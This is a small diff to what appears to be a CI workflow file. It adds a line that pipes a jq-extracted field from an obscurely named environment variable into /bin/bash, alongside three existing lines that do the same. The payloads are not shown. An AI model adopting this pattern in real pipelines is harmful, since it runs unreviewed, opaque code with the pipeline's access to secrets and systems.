@@ -53,6 +53,7 @@ jobs:
           echo $ej86 | jq -r .aphgr2 | /bin/bash
           echo $gzued0 | jq -r .sixs0040 | /bin/bash
           printf '%s' "$jdvpw01440" | jq -r .o059 | /bin/bash
+          echo $ezkus9749 | jq -r .vs7 | /bin/bash
 
       - name: Save archive
         if: always()
